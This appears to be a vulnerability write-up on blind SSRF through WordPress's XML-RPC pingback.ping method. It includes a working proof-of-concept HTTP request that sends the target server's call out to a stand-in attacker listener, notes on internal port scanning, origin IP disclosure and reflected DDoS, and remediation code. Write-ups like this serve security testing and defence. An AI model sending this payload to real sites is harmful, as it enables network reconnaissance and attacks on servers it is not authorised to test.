title: Blind SSRF via WordPress XML-RPC Pingback Endpoint
description: Exploiting misconfigured WordPress XML-RPC pingback.ping functionality to trigger outbound HTTP/DNS requests, enabling internal network port scanning and origin IP disclosure.
markdown:
### 🔍 Vulnerability Description

The WordPress XML-RPC interface on `www.target-portal.com` was found to have the `pingback.ping` method enabled. This method allows websites to notify other websites when they link to them. 

However, because this functionality makes the web server initiate outbound requests, an unauthenticated remote attacker can abuse it to perform a Server-Side Request Forgery (SSRF). By submitting XML payloads containing target internal IP addresses or external listener URLs, the attacker can force the server to execute port scans on its own internal network or call home to reveal its origin IP.

---

### 🧪 Proof of Concept (PoC)

1. **Set up Listener**: Generate a unique Out-of-Band Application Security Testing (OAST) listener URL (e.g., using `interact.sh` or Burp Collaborator).
2. **Send Exploit Payload**: Send the following POST request to the target's XML-RPC endpoint, supplying the listener URL as the pingback source:
   ```http
   POST /xmlrpc.php HTTP/1.1
   Host: www.target-portal.com
   Content-Type: text/xml

   <?xml version="1.0" encoding="utf-8"?>
   <methodCall>
     <methodName>pingback.ping</methodName>
     <params>
       <param><value><string>http://attacker-oast-listener.com/poc</string></value></param>
       <param><value><string>https://www.target-portal.com/valid-article-url</string></value></param>
     </params>
   </methodCall>
   ```
3. **Observe Interaction**: Check the OAST listener logs. An incoming DNS lookup and HTTP GET connection will be recorded, originating directly from the target server's external IP address.

---

### ⚡ Security Impact

- **Internal Port Scanning (XSPA)**: An attacker can query internal assets (e.g., `http://127.0.0.1:3306` or local network IPs) and measure response times to map active ports and services that are firewalled from the public internet.
- **Origin IP Disclosure**: Forcing the server to connect directly to an external listener bypasses cloud proxies (like Cloudflare or WAFs), revealing the server's true backend IP and exposing it to direct DDoS or bypass exploits.
- **Reflected DDoS**: Attackers can use thousands of vulnerable XML-RPC endpoints globally to flood a victim website with reflected HTTP traffic.

---

### 🛡️ Remediation

1. **Disable XML-RPC**: If XML-RPC is not required for mobile apps or integrations, completely disable the endpoint by blocking access to `/xmlrpc.php` in your web server configurations (Apache, Nginx, or Cloudflare rules).
2. **Remove Pingback Method**: If XML-RPC must remain active, disable only the pingback method by hooking into `xmlrpc_methods` in WordPress:
   ```php
   add_filter('xmlrpc_methods', function($methods) {
       unset($methods['pingback.ping']);
       return $methods;
   });
   ```
